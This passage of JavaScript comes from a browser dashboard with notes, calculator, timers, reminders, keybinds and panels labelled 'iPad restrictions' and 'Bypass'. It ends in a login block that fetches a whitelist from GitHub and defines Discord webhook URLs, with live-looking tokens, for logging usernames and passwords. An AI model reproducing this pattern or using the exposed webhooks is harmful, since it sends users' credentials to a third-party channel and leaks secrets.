          ctx.lineTo(pos.x, pos.y);
          ctx.strokeStyle = isErasing ? '#fff' : brushColor;
          ctx.lineWidth = brushThickness;
          ctx.lineCap = 'round';
          ctx.lineJoin = 'round';
          ctx.globalCompositeOperation = isErasing ? 'destination-out' : 'source-over';
          ctx.stroke();
          e.preventDefault();
        });

        ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => {
          canvas.addEventListener(evtName, () => {
            if (drawing) {
                drawing = false;
                saveCanvasState(); // Save state after drawing stops
            }
          });
        });

        clearCanvasBtn.addEventListener('click', () => {
          if (!settings.confirmDangerousActions || confirm('Are you sure you want to clear the entire canvas?')) {
            saveCanvasState(); // Save current state to undo stack before clearing
            clearCanvas();
            showDashboardAlert('Canvas cleared!', 'info');
            dashboard.updateStats('notes');
          }
        });

        // Notes Controls
        brushThicknessInput.addEventListener('input', (e) => {
            brushThickness = parseInt(e.target.value);
            recordActivity('Brush Thickness Changed', `Value: ${brushThickness}`);
        });
        brushColorInput.addEventListener('input', (e) => {
            brushColor = e.target.value;
            // When color changes, ensure we're not in eraser mode (visual cue)
            isErasing = false;
            toggleEraserBtn.textContent = '🧽 Eraser';
            recordActivity('Brush Color Changed', `Color: ${brushColor}`);
        });
        toggleEraserBtn.addEventListener('click', () => {
            isErasing = !isErasing;
            toggleEraserBtn.textContent = isErasing ? '🖌️ Draw' : '🧽 Eraser';
            showDashboardAlert(`Mode: ${isErasing ? 'Eraser' : 'Draw'}`, 'info');
            recordActivity('Canvas Mode Toggled', isErasing ? 'Eraser' : 'Draw');
            dashboard.updateStats('notes');
        });
        toggleTextNotesBtn.addEventListener('click', () => {
            const isVisible = textNotesArea.style.display === 'block';
            textNotesArea.style.display = isVisible ? 'none' : 'block';
            textNotesArea.focus(); // Focus when shown
            showDashboardAlert(`Text notes ${isVisible ? 'hidden' : 'shown'}`, 'info');
            recordActivity('Text Notes Toggled', isVisible ? 'Off' : 'On');
            dashboard.updateStats('notes');
        });

        // Undo/Redo
        undoCanvasBtn.addEventListener('click', () => {
            if (undoStack.length > 1) { // Always keep at least one state (the current one before undo)
                const currentState = undoStack.pop();
                redoStack.push(currentState);
                restoreCanvasState(undoStack[undoStack.length - 1]);
                showDashboardAlert('Undo last action!', 'info');
                recordActivity('Undo Canvas Action');
                dashboard.updateStats('notes');
            } else {
                showDashboardAlert('Nothing to undo.', 'warning');
            }
        });

        redoCanvasBtn.addEventListener('click', () => {
            if (redoStack.length > 0) {
                const redoneState = redoStack.pop();
                undoStack.push(redoneState);
                restoreCanvasState(redoneState);
                showDashboardAlert('Redo last action!', 'info');
                recordActivity('Redo Canvas Action');
                dashboard.updateStats('notes');
            } else {
                showDashboardAlert('Nothing to redo.', 'warning');
            }
        });

        // Save/Export Notes
        saveCanvasBtn.addEventListener('click', () => {
            localStorage.setItem('savedCanvasDrawing', canvas.toDataURL());
            localStorage.setItem('savedTextNotes', textNotesArea.value);
            showDashboardAlert('Notes (drawing & text) saved locally!', 'success');
            recordActivity('Notes Saved Locally');
            dashboard.updateStats('notes');
        });

        exportNotesPngBtn.addEventListener('click', () => {
          html2canvas(canvas).then(canvasImg => {
            const link = document.createElement('a');
            link.download = 'dashboard_notes.png';
            link.href = canvasImg.toDataURL('image/png');
            link.click();
            showDashboardAlert('Canvas drawing exported as PNG!', 'success');
            recordActivity('Notes Exported PNG');
            dashboard.updateStats('notes');
          });
        });

        exportNotesJsonBtn.addEventListener('click', () => {
            const notesData = {
                drawing: canvas.toDataURL(),
                text: textNotesArea.value,
                timestamp: new Date().toISOString()
            };
            const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(notesData, null, 2));
            const dlAnchorElem = document.createElement('a');
            dlAnchorElem.setAttribute("href", dataStr);
            dlAnchorElem.setAttribute("download", "dashboard_notes.json");
            dlAnchorElem.click();
            showDashboardAlert('Notes exported as JSON!', 'success');
            recordActivity('Notes Exported JSON');
            dashboard.updateStats('notes');
        });

        importNotesJsonBtn.addEventListener('click', () => {
            if (!settings.confirmDangerousActions || confirm('Importing notes will overwrite current canvas and text. Continue?')) {
                const input = document.createElement('input');
                input.type = 'file';
                input.accept = 'application/json';
                input.onchange = (e) => {
                    const file = e.target.files[0];
                    if (file) {
                        const reader = new FileReader();
                        reader.onload = (event) => {
                            try {
                                const importedData = JSON.parse(event.target.result);
                                if (importedData.drawing) {
                                    restoreCanvasState(importedData.drawing);
                                    saveCanvasState(); // Save to undo history
                                }
                                if (importedData.text) {
                                    textNotesArea.value = importedData.text;
                                }
                                showDashboardAlert('Notes imported successfully!', 'success');
                                recordActivity('Notes Imported JSON');
                                dashboard.updateStats('notes');
                            } catch (error) {
                                showDashboardAlert('Failed to import notes: Invalid JSON.', 'error');
                                recordActivity('Notes Import Failed');
                            }
                        };
                        reader.readAsText(file);
                    }
                };
                input.click();
            }
        });


        // Load previously saved notes
        const savedCanvas = localStorage.getItem('savedCanvasDrawing');
        const savedText = localStorage.getItem('savedTextNotes');
        if (savedCanvas) {
            restoreCanvasState(savedCanvas);
            // Rebuild undoStack with loaded state if it was a single saved state.
            // If the user always wants a fresh undo stack for the new session, don't pre-populate.
            // For now, load, then next stroke saves as first new state.
            undoStack = [savedCanvas];
        } else {
             // If no saved drawing, save the initial clear state
            saveCanvasState();
        }
        if (savedText) {
            textNotesArea.value = savedText;
        }

      }, // End initNotesCanvas

      // General panel toggler for dashboard info-panels
      initInfoPanels: function() {
        document.querySelectorAll('.info-panel').forEach(panel => {
          panel.style.display = 'none'; // Ensure all info-panels are hidden initially
        });

        // Initialize display of content within special panels (e.g., iPad, Bypass)
        document.querySelectorAll('.ipad-content').forEach(content => { content.style.display = 'none'; });
        document.querySelectorAll('.bypass-content').forEach(content => { content.style.display = 'none'; });
        document.querySelectorAll('.timer-section').forEach(content => { content.style.display = 'block'; }); // Ensure timers are shown when panel is open

        // Initial calls for iPad and Bypass contents (default to first option, if desired)
        dashboard.showIpadContent('restrictions'); // Default tab for iPad panel
        dashboard.showBypassContent('bathroom');   // Default tab for Bypass panel

      },

      toggleMainSections: function() {
          const mainGrid = document.getElementById('mainGrid');
          const notesPanel = document.getElementById('notesPanel');
          const toggleBtn = document.querySelector('.quick-bar-secondary button[onclick="dashboard.togglePanel(\'toggleSections\')"]');

          const isMainGridVisible = mainGrid.style.display !== 'none';
          mainGrid.style.display = isMainGridVisible ? 'none' : 'grid';
          if(notesPanel.style.display === 'block' && mainGrid.style.display === 'grid') {
            notesPanel.style.display = 'none'; // Hide notes if main grid shows
            document.querySelector('.quick-bar-secondary button[onclick="dashboard.togglePanel(\'notesPanel\')"]').textContent = '📒 Notes';
          }

          if (isMainGridVisible) {
            toggleBtn.innerHTML = '⬇️ Toggle Main Sections';
            recordActivity('Main Sections Toggled Off');
            dashboard.updateStats('panelsClosed');
          } else {
            toggleBtn.innerHTML = '⬆️ Toggle Main Sections';
            recordActivity('Main Sections Toggled On');
            dashboard.updateStats('panelsOpened');
          }
      },

      togglePanel: function(panelId) {
        let panel;
        const mainGrid = document.getElementById('mainGrid');
        const notesButton = document.querySelector('.quick-bar-secondary button[onclick="dashboard.togglePanel(\'notesPanel\')"]');

        // Handle special case for 'notesPanel' to use standalone display
        if (panelId === 'notesPanel') {
            panel = document.getElementById(panelId);
            const isVisible = panel.style.display === 'block';
            panel.style.display = isVisible ? 'none' : 'block';
            mainGrid.style.display = isVisible ? 'grid' : 'none'; // Hide main grid when notes are open
            notesButton.textContent = isVisible ? '📒 Notes' : '✏️ Hide Notes';
            if(isVisible) dashboard.activePanels.delete(panelId);
            else dashboard.activePanels.add(panelId);
            showDashboardAlert(`${panelId} ${isVisible ? 'closed' : 'opened'}`, 'info');
            recordActivity(`Panel Toggled: ${panelId}`, isVisible ? 'Closed' : 'Opened');
            dashboard.updateStats(isVisible ? 'panelsClosed' : 'panelsOpened');
            return;
        } else if (panelId === 'toggleSections') { // Handle 'Toggle Main Sections'
          dashboard.toggleMainSections();
          return;
        }

        // Hide other main panels when one of the specific info panels opens
        document.querySelectorAll('.info-panel').forEach(p => {
            if (p.id !== panelId) {
                p.style.display = 'none';
                dashboard.activePanels.delete(p.id); // Remove from active set
            }
        });

        // Toggle the requested panel
        panel = document.getElementById(panelId);
        if (panel) {
          const isVisible = panel.style.display === 'block';
          panel.style.display = isVisible ? 'none' : 'block';
          if (isVisible) {
            dashboard.activePanels.delete(panelId);
          } else {
            dashboard.activePanels.add(panelId);
          }
          showDashboardAlert(`${panel.querySelector('h2').textContent.trim()} ${isVisible ? 'closed' : 'opened'}`, 'info');
          recordActivity(`Panel Toggled: ${panelId}`, isVisible ? 'Closed' : 'Opened');
          dashboard.updateStats(isVisible ? 'panelsClosed' : 'panelsOpened');
        } else {
            showDashboardAlert('Panel not found!', 'error');
        }
      },

      showIpadContent: function(contentId) {
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1)).style.display = 'block';
        recordActivity('iPad Content Switched', contentId);
      },

      showBypassContent: function(contentId) {
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById(contentId + 'Bypass').style.display = 'block';
        recordActivity('Bypass Content Switched', contentId);
      },

      makePanelsDraggableResizable: function() {
          const panelElements = document.querySelectorAll('.draggable-resizable');
          const panelLayouts = JSON.parse(localStorage.getItem('panelLayout')) || {};

          panelElements.forEach(panel => {
              // Apply saved layout
              if (panelLayouts[panel.id]) {
                  const layout = panelLayouts[panel.id];
                  $(panel).css({
                      position: 'absolute', // Important for draggable
                      left: layout.left,
                      top: layout.top,
                      width: layout.width,
                      height: layout.height
                  });
              } else {
                  $(panel).css({ position: 'relative' }); // Default positioning
              }


              $(panel).draggable({
                  containment: "#mainGrid", // Keep within mainGrid
                  stack: ".draggable-resizable",
                  handle: "h2", // Drag only by title
                  start: function() {
                    $(this).css('opacity', 0.8);
                    recordActivity('Panel Drag Start', panel.id);
                  },
                  stop: function(event, ui) {
                      panelLayouts[panel.id] = {
                          left: ui.position.left,
                          top: ui.position.top,
                          width: $(this).width(),
                          height: $(this).height()
                      };
                      localStorage.setItem('panelLayout', JSON.stringify(panelLayouts));
                      $(this).css('opacity', 1);
                      recordActivity('Panel Drag End', panel.id);
                  }
              });

              $(panel).resizable({
                  minHeight: 120,
                  minWidth: 200,
                  handles: 'se, sw', // Only bottom-right for resizing
                  start: function() {
                      $(this).css('opacity', 0.8);
                      recordActivity('Panel Resize Start', panel.id);
                  },
                  stop: function(event, ui) {
                      panelLayouts[panel.id] = {
                          left: ui.position.left,
                          top: ui.position.top,
                          width: ui.size.width,
                          height: ui.size.height
                      };
                      localStorage.setItem('panelLayout', JSON.stringify(panelLayouts));
                      $(this).css('opacity', 1);
                      recordActivity('Panel Resize End', panel.id);
                  }
              });
          });
          dashboard.applyDraggableResizableSettings(); // Apply initial settings like snap to grid
          recordActivity('Draggable/Resizable Panels Initialized');
      },

      // Apply drag/resize related settings
      applyDraggableResizableSettings: function() {
        const snap = settings.panelSnapToGrid;
        $( ".draggable-resizable" ).draggable( "option", "snap", snap );
        $( ".draggable-resizable" ).draggable( "option", "snapMode", "outer" );
        $( ".draggable-resizable" ).draggable( "option", "snapTolerance", 15 );
      },


      initCalculator: function() {
          const display = document.getElementById('calcDisplay');
          const buttons = document.querySelectorAll('#calculator button');
          let currentInput = '0';
          let previousInput = '';
          let operator = null;
          let resetDisplay = false;

          const updateDisplay = (value) => {
              display.value = value;
          };

          const calculate = () => {
              let result;
              const prev = parseFloat(previousInput);
              const current = parseFloat(currentInput);

              if (isNaN(prev) || isNaN(current)) return;

              switch (operator) {
                  case '+': result = prev + current; break;
                  case '-': result = prev - current; break;
                  case '*': result = prev * current; break;
                  case '/': result = prev / current; break;
                  default: return;
              }
              currentInput = result.toString();
              operator = null;
          };

          buttons.forEach(button => {
              button.addEventListener('click', () => {
                  const value = button.dataset.value;
                  recordActivity('Calculator Button Pressed', value);

                  if (value === 'C') {
                      currentInput = '0';
                      previousInput = '';
                      operator = null;
                      updateDisplay(currentInput);
                      return;
                  }

                  if (value === '=') {
                      calculate();
                      updateDisplay(currentInput);
                      resetDisplay = true;
                      return;
                  }

                  if (['+', '-', '*', '/'].includes(value)) {
                      if (operator && previousInput !== '') {
                          calculate();
                      } else {
                          previousInput = currentInput;
                      }
                      operator = value;
                      resetDisplay = true;
                      updateDisplay(currentInput); // Show current result or first number
                      return;
                  }

                  // Handle numbers and decimals
                  if (resetDisplay) {
                      currentInput = value;
                      resetDisplay = false;
                  } else {
                      if (currentInput === '0' && value !== '.') {
                          currentInput = value;
                      } else if (value === '.' && currentInput.includes('.')) {
                          // Do nothing if decimal already exists
                      } else {
                          currentInput += value;
                      }
                  }
                  updateDisplay(currentInput);
              });
          });

          // Ensure panel toggling works for calculator
          document.getElementById('calculatorBtn').addEventListener('click', () => {
              dashboard.togglePanel('calculator');
              recordActivity('Calculator Panel Toggled');
          });
      }, // End initCalculator

      initUnitConverter: function() {
          const fromValueInput = document.getElementById('convertFromValue');
          const toValueInput = document.getElementById('convertToValue');
          const fromUnitSelect = document.getElementById('convertFromUnit');
          const toUnitSelect = document.getElementById('convertToUnit');

          const conversionRates = { // 1 unit to meters (base unit)
              'meters': 1,
              'feet': 0.3048,
              'cm': 0.01,
              'inches': 0.0254,
              'kg': 1, // base for weight
              'lbs': 0.453592
              // Add more units
          };

          // To display, for instance, a dropdown with only compatible unit types, can be expanded.
          const compatibleUnitTypes = {
            'meters': ['feet', 'cm', 'inches'],
            'feet': ['meters', 'cm', 'inches'],
            'cm': ['meters', 'feet', 'inches'],
            'inches': ['meters', 'feet', 'cm'],
            'kg': ['lbs'],
            'lbs': ['kg']
          };

          // Populate selects (basic units, expand as needed)
          function populateUnitSelects() {
            const unitsLength = {
                'meters': 'Meters', 'feet': 'Feet', 'cm': 'Centimeters', 'inches': 'Inches'
            };
            const unitsWeight = {
                'kg': 'Kilograms', 'lbs': 'Pounds'
            };
            // Example for dynamic grouping
            const allUnits = { ...unitsLength, ...unitsWeight };

            // For simplicity, just append all current supported conversion units.
            // If the structure of conversionRates becomes more complex (e.g., categories like length, weight, volume)
            // then we'd dynamically build `option` elements based on selected category.
            const generateOptions = (selectElement) => {
              selectElement.innerHTML = '';
              for (const unitKey in conversionRates) {
                const option = document.createElement('option');
                option.value = unitKey;
                option.textContent = unitKey.charAt(0).toUpperCase() + unitKey.slice(1);
                selectElement.appendChild(option);
              }
            };
            generateOptions(fromUnitSelect);
            generateOptions(toUnitSelect);
            fromUnitSelect.value = 'meters';
            toUnitSelect.value = 'feet';
          }
          populateUnitSelects();


          function convertUnits() {
              const value = parseFloat(fromValueInput.value);
              const fromUnit = fromUnitSelect.value;
              const toUnit = toUnitSelect.value;

              if (isNaN(value) || !fromUnit || !toUnit || fromUnit === toUnit) {
                  toValueInput.value = '';
                  return;
              }

              // Convert 'from' unit to base unit (meters for length, kg for weight etc.)
              const valueInBase = value * conversionRates[fromUnit];
              // Convert base unit to 'to' unit
              const result = valueInBase / conversionRates[toUnit];

              toValueInput.value = result.toFixed(4); // Display with 4 decimal places
              recordActivity('Unit Converted', `${value} ${fromUnit} to ${toUnit}: ${result.toFixed(4)}`);
          }

          fromValueInput.addEventListener('input', convertUnits);
          fromUnitSelect.addEventListener('change', convertUnits);
          toUnitSelect.addEventListener('change', convertUnits);

          // Initial conversion
          convertUnits();

          document.getElementById('unitConverterBtn').addEventListener('click', () => {
              dashboard.togglePanel('unitConverter');
              convertUnits(); // Recalculate on open
              recordActivity('Unit Converter Panel Toggled');
          });
      }, // End initUnitConverter

      initTimers: function() {
        // Stopwatch Logic
        let stopwatchInterval;
        let stopwatchTime = 0;
        let isStopwatchRunning = false;
        const stopwatchDisplay = document.getElementById('stopwatchDisplay');

        function formatTimerTime(totalSeconds) {
            const h = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
            const m = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
            const s = String(totalSeconds % 60).padStart(2, '0');
            return `${h}:${m}:${s}`;
        }

        document.getElementById('startStopwatch').addEventListener('click', () => {
            if (!isStopwatchRunning) {
                isStopwatchRunning = true;
                stopwatchInterval = setInterval(() => {
                    stopwatchTime++;
                    stopwatchDisplay.textContent = formatTimerTime(stopwatchTime);
                }, 1000);
                recordActivity('Stopwatch Started');
            }
        });
        document.getElementById('pauseStopwatch').addEventListener('click', () => {
            clearInterval(stopwatchInterval);
            isStopwatchRunning = false;
            recordActivity('Stopwatch Paused');
        });
        document.getElementById('resetStopwatch').addEventListener('click', () => {
            clearInterval(stopwatchInterval);
            isStopwatchRunning = false;
            stopwatchTime = 0;
            stopwatchDisplay.textContent = formatTimerTime(stopwatchTime);
            recordActivity('Stopwatch Reset');
        });

        // Countdown Timer Logic
        let countdownInterval;
        let totalCountdownSeconds;
        let initialCountdownSeconds;
        let isCountdownRunning = false;
        const countdownDisplay = document.getElementById('countdownDisplay');
        const countdownHoursInput = document.getElementById('countdownHours');
        const countdownMinutesInput = document.getElementById('countdownMinutes');
        const countdownSecondsInput = document.getElementById('countdownSeconds');

        function updateCountdownInputs() {
            const h = parseInt(countdownHoursInput.value) || 0;
            const m = parseInt(countdownMinutesInput.value) || 0;
            const s = parseInt(countdownSecondsInput.value) || 0;
            totalCountdownSeconds = (h * 3600) + (m * 60) + s;
            initialCountdownSeconds = totalCountdownSeconds;
            countdownDisplay.textContent = formatTimerTime(totalCountdownSeconds);
        }
        countdownHoursInput.addEventListener('input', updateCountdownInputs);
        countdownMinutesInput.addEventListener('input', updateCountdownInputs);
        countdownSecondsInput.addEventListener('input', updateCountdownInputs);
        updateCountdownInputs(); // Initial display

        document.getElementById('startCountdown').addEventListener('click', () => {
            if (!isCountdownRunning && totalCountdownSeconds > 0) {
                isCountdownRunning = true;
                countdownInterval = setInterval(() => {
                    if (totalCountdownSeconds <= 0) {
                        clearInterval(countdownInterval);
                        isCountdownRunning = false;
                        showDashboardAlert('Countdown finished!', 'success', 5000);
                        countdownDisplay.textContent = '00:00:00';
                        recordActivity('Countdown Finished');
                        return;
                    }
                    totalCountdownSeconds--;
                    countdownDisplay.textContent = formatTimerTime(totalCountdownSeconds);
                }, 1000);
                recordActivity('Countdown Started', formatTimerTime(initialCountdownSeconds));
            } else if (totalCountdownSeconds === 0) {
              showDashboardAlert('Set a time for the countdown!', 'warning');
            }
        });
        document.getElementById('pauseCountdown').addEventListener('click', () => {
            clearInterval(countdownInterval);
            isCountdownRunning = false;
            recordActivity('Countdown Paused');
        });
        document.getElementById('resetCountdown').addEventListener('click', () => {
            clearInterval(countdownInterval);
            isCountdownRunning = false;
            totalCountdownSeconds = initialCountdownSeconds;
            countdownDisplay.textContent = formatTimerTime(totalCountdownSeconds);
            recordActivity('Countdown Reset');
        });

        document.getElementById('timersBtn').addEventListener('click', () => {
            dashboard.togglePanel('timersPanel');
            recordActivity('Timers Panel Toggled');
        });
      }, // End initTimers

      initActivityLogger: function() {
          const logsDisplay = document.getElementById('dashboardActivityLogsDisplay');

          function renderLogs() {
              if (logsDisplay) {
                  if (activityLog.length === 0) {
                      logsDisplay.innerHTML = '<p>No activity recorded yet for this session.</p>';
                  } else {
                      logsDisplay.innerHTML = activityLog.map(log => `
                          <div class="log-entry">
                              <strong>${log.timestamp}</strong>: ${log.action} <span>${log.details ? ` - ${log.details}` : ''}</span>
                          </div>
                      `).join('');
                  }
                  logsDisplay.scrollTop = logsDisplay.scrollHeight; // Scroll to bottom
              }
          }

          document.getElementById('downloadActivityLogsBtn').addEventListener('click', () => {
              const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(activityLog, null, 2));
              const dlAnchorElem = document.createElement('a');
              dlAnchorElem.setAttribute("href", dataStr);
              dlAnchorElem.setAttribute("download", "dashboard_activity_log.json");
              dlAnchorElem.click();
              showDashboardAlert('Activity logs downloaded!', 'success');
              recordActivity('Downloaded Activity Logs');
          });

          document.getElementById('activityLogsBtn').addEventListener('click', () => {
              dashboard.togglePanel('activityLogsPanel');
              renderLogs(); // Re-render logs when panel is opened
              recordActivity('Activity Logs Panel Toggled');
          });

          // Function to clean logs based on retention period (part of settings)
          this.cleanLogs = (retentionDays) => {
              const cutoffDate = new Date();
              cutoffDate.setDate(cutoffDate.getDate() - retentionDays);
              const initialLogCount = activityLog.length;
              activityLog = activityLog.filter(log => new Date(log.timestamp) > cutoffDate);
              if (activityLog.length !== initialLogCount) {
                  localStorage.setItem('dashboardActivityLog', JSON.stringify(activityLog));
                  showDashboardAlert(`Cleaned old activity logs (${initialLogCount - activityLog.length} entries removed).`, 'info');
              }
          };
          this.cleanLogs(settings.dataRetentionPeriod); // Run on init
      }, // End initActivityLogger


      initLoginHistory: function() {
          const loginHistoryDisplay = document.getElementById('loginHistoryDisplay');

          // Log current successful login
          loginHistory.push({
              timestamp: new Date().toLocaleString(),
              username: document.getElementById('loggedInUser').textContent,
              userID: document.getElementById('loggedInID').textContent
          });
          localStorage.setItem('loginHistory', JSON.stringify(loginHistory));

          function renderLoginHistory() {
              if (loginHistoryDisplay) {
                  if (loginHistory.length === 0) {
                      loginHistoryDisplay.innerHTML = '<p>No login history available.</p>';
                  } else {
                      // Display newest first
                      loginHistoryDisplay.innerHTML = loginHistory.slice().reverse().map(entry => `
                          <div class="history-entry">
                              <strong>${entry.timestamp}</strong> - User: ${entry.username} (ID: ${entry.userID})
                          </div>
                      `).join('');
                  }
              }
          }

          document.getElementById('loginHistoryBtn').addEventListener('click', () => {
              dashboard.togglePanel('loginHistoryPanel');
              renderLoginHistory(); // Update display when panel opens
              recordActivity('Login History Panel Toggled');
          });
      }, // End initLoginHistory

      initKeybinds: function() {
          const keybindsList = document.getElementById('keybindsList');
          let customKeybinds = JSON.parse(localStorage.getItem('customKeybinds')) || {};

          const defaultKeybinds = {
              'F1': { action: 'togglePanel("calendarBox")', desc: 'Toggle Calendar' },
              'F2': { action: 'togglePanel("notesPanel")', desc: 'Open Notes' },
              'Shift+L': { action: 'logoutUser()', desc: 'Log Out' },
              'Control+P': { action: 'triggerPanic()', desc: 'Trigger Panic Button' }
              // Add more default keybinds
          };

          function applyKeybinds(event) {
              let keyCombo = [];
              if (event.ctrlKey) keyCombo.push('Control');
              if (event.shiftKey) keyCombo.push('Shift');
              if (event.altKey) keyCombo.push('Alt');
              if (event.key) {
                  let key = event.key;
                  // Handle special keys like F1-F12, Esc, Enter etc.
                  if (key.length === 1 && keyCombo.includes('Shift')) { // If it's Shift + a letter, key.toUpperCase()
                     keyCombo.push(key.toUpperCase());
                  } else if (event.key.startsWith('F')) { // F-keys often just event.key = "F1"
                      keyCombo.push(event.key);
                  } else if (event.key.length > 1) {
                      // Common special keys (Escape, Enter, ArrowUp, etc.)
                      keyCombo.push(event.key.charAt(0).toUpperCase() + event.key.slice(1));
                  } else { // Single lowercase letters
                    keyCombo.push(event.key);
                  }
              }

              const mappedKey = keyCombo.join('+');

              // Prioritize custom keybinds
              let actionToExecute = customKeybinds[mappedKey] ? customKeybinds[mappedKey].action : defaultKeybinds[mappedKey]?.action;

              if (actionToExecute) {
                  event.preventDefault(); // Prevent default browser action for keybind
                  try {
                      if (actionToExecute === 'logoutUser()') {
                          dashboard.logoutUser();
                      } else if (actionToExecute === 'triggerPanic()') {
                          document.getElementById('panicBtn').click(); // Simulate click on panic
                      } else if (actionToExecute.startsWith('togglePanel(')) {
                          // Extract panel ID from string 'togglePanel("panelId")'
                          const match = actionToExecute.match(/togglePanel\('([^']+)'\)/);
                          if (match && match[1]) {
                            dashboard.togglePanel(match[1]);
                          }
                      } else {
                          // Eval should be used with extreme caution, ensure controlled inputs
                          // For a user configurable system, it's a security risk.
                          // A safer alternative would be to map string actions to predefined functions.
                          // eval(actionToExecute); // Dangerous, keeping as a placeholder.
                          showDashboardAlert(`Action: ${actionToExecute} (eval disabled)`, 'warning');
                      }
                      recordActivity('Keybind Used', mappedKey);
                  } catch (e) {
                      console.error("Keybind action failed:", e);
                      showDashboardAlert(`Keybind action failed for ${mappedKey}`, 'error');
                  }
              }
          }

          // Attach global keydown listener
          document.addEventListener('keydown', applyKeybinds);

          document.getElementById('keybindsBtn').addEventListener('click', () => {
              dashboard.togglePanel('keybindsPanel');
              renderKeybinds();
              recordActivity('Keybinds Panel Toggled');
          });

          function renderKeybinds() {
              keybindsList.innerHTML = ''; // Clear previous
              const allKeybinds = { ...defaultKeybinds, ...customKeybinds }; // Show all

              for (const keyCombo in allKeybinds) {
                  const entry = document.createElement('div');
                  entry.className = 'log-entry';
                  entry.innerHTML = `<strong>${keyCombo}</strong>: ${allKeybinds[keyCombo].desc}`;
                  // Optional: Add edit/delete buttons per keybind
                  keybindsList.appendChild(entry);
              }
          }
          renderKeybinds(); // Initial render

          // Simplified panic function for direct calls
          dashboard.triggerPanic = () => document.getElementById('panicBtn').click();
      },

      initMediaPlayer: function() {
        const youtubeUrlInput = document.getElementById('youtubeUrlInput');
        const loadYoutubeVideoBtn = document.getElementById('loadYoutubeVideo');
        const youtubeVideoPlayer = document.getElementById('youtubeVideoPlayer');

        loadYoutubeVideoBtn.addEventListener('click', () => {
          const url = youtubeUrlInput.value.trim();
          let videoId = '';

          if (url.includes('youtube.com/watch?v=')) {
            const urlParams = new URLSearchParams(new URL(url).search);
            videoId = urlParams.get('v');
          } else if (url.includes('youtu.be/')) {
            videoId = url.split('youtu.be/')[1];
          } else if (url.length === 11) { // Assume it's just a video ID
            videoId = url;
          }

          if (videoId) {
            youtubeVideoPlayer.src = `https://www.youtube.com/embed/${videoId}?autoplay=1`;
            youtubeVideoPlayer.style.display = 'block';
            showDashboardAlert(`Loading YouTube video: ${videoId}`, 'info');
            recordActivity('Media Loaded', `YouTube video ID: ${videoId}`);
          } else {
            showDashboardAlert('Invalid YouTube URL or ID.', 'error');
            recordActivity('Media Load Failed', `Invalid URL: ${url}`);
          }
        });

        document.getElementById('mediaBtn').addEventListener('click', () => {
            dashboard.togglePanel('mediaPanel');
            recordActivity('Media Panel Toggled');
        });
      },

      initReminders: function() {
          const reminderText = document.getElementById('reminderText');
          const reminderTime = document.getElementById('reminderTime');
          const addReminderBtn = document.getElementById('addReminderBtn');
          const reminderListDiv = document.getElementById('reminderList');
          let reminders = JSON.parse(localStorage.getItem('userReminders')) || [];

          function saveReminders() {
              localStorage.setItem('userReminders', JSON.stringify(reminders));
          }

          function renderReminders() {
              reminderListDiv.innerHTML = '';
              if (reminders.length === 0) {
                  reminderListDiv.innerHTML = '<p>No reminders set.</p>';
                  return;
              }

              const now = new Date();
              reminders.sort((a, b) => new Date(a.time) - new Date(b.time)); // Sort by time

              reminders.forEach((reminder, index) => {
                  const reminderDate = new Date(reminder.time);
                  const isTriggered = reminderDate <= now;

                  const div = document.createElement('div');
                  div.className = `reminder-item ${isTriggered && !reminder.dismissed ? 'triggered' : ''}`;
                  const formattedTime = reminderDate.toLocaleString();
                  div.innerHTML = `
                      <span><strong>${formattedTime}</strong>: ${reminder.text}</span>
                      <button data-index="${index}">Dismiss</button>
                  `;
                  reminderListDiv.appendChild(div);

                  // Schedule alert if not yet triggered and not dismissed
                  if (!isTriggered && !reminder.dismissed) {
                      const timeToAlert = reminderDate.getTime() - now.getTime();
                      setTimeout(() => {
                          if (!reminder.dismissed) { // Check again just before triggering
                              showDashboardAlert(`Reminder: ${reminder.text}`, 'warning', 10000);
                              div.classList.add('triggered'); // Update visual
                              recordActivity('Reminder Triggered', reminder.text);
                          }
                      }, timeToAlert);
                  }
              });
          }

          addReminderBtn.addEventListener('click', () => {
              const text = reminderText.value.trim();
              const time = reminderTime.value; // ISO format from datetime-local input

              if (!text || !time) {
                  showDashboardAlert('Please enter both text and a valid date/time for the reminder.', 'error');
                  return;
              }

              const reminderDate = new Date(time);
              if (reminderDate <= new Date()) {
                  showDashboardAlert('Reminder time must be in the future.', 'error');
                  return;
              }

              reminders.push({ text, time, dismissed: false });
              saveReminders();
              renderReminders();
              showDashboardAlert('Reminder added!', 'success');
              reminderText.value = '';
              reminderTime.value = '';
              recordActivity('Reminder Added', `${text} at ${time}`);
          });

          reminderListDiv.addEventListener('click', (e) => {
              if (e.target.tagName === 'BUTTON' && e.target.textContent === 'Dismiss') {
                  const index = parseInt(e.target.dataset.index);
                  if (!isNaN(index) && reminders[index]) {
                      reminders[index].dismissed = true; // Mark as dismissed instead of removing
                      saveReminders();
                      renderReminders(); // Re-render to update UI (e.g. gray out dismissed)
                      showDashboardAlert('Reminder dismissed.', 'info');
                      recordActivity('Reminder Dismissed', reminders[index].text);

                      // To truly remove, use:
                      // reminders.splice(index, 1);
                      // saveReminders();
                      // renderReminders();
                  }
              }
          });

          // Render reminders on initial load of dashboard
          document.getElementById('remindersBtn').addEventListener('click', () => {
              dashboard.togglePanel('remindersPanel');
              renderReminders();
              recordActivity('Reminders Panel Toggled');
          });

          renderReminders(); // Initial rendering of reminders
      } // End initReminders

    }; // End dashboard object


    // Login System JavaScript IIFE
    (() => {
      const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

      // Webhooks for the new logging systems
      const loggingWebhooks = {
        username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
        password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
